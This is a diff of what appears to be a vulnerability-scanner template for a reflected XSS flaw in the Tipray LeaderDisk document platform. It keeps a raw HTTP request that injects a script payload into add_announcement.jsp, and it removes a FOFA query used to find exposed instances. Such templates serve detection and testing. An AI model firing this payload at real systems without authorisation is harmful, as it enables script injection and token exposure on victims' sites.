@@ -3,12 +3,8 @@ info:
   name: 天锐绿盘云文档安全管理平台add_announcement.jsp存在XSS漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xxd2d22lxrvehu96'
+  description: ''
   tags: xss,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xxd2d22lxrvehu96
-    fofa: body="/lddsm/" || title="天锐绿盘" || title=="Tipray LeaderDisk"||body="location.href=location.href+"lddsm""
 http:
 - raw:
   - 'GET /lddsm/frontend/manage/announcement/add_announcement.jsp?mode=add''</script><script>alert(document.domain);</script><script>// HTTP/1.1
@@ -17,7 +13,7 @@ http:
 
     Accept-Encoding: gzip, deflate
 
-    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1757221240652-c6459fc0-e3f1-47d2-b29b-ef3bade89fa6.png)
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
 
     此时回显的便为token，此时token为低权限数据权限
 
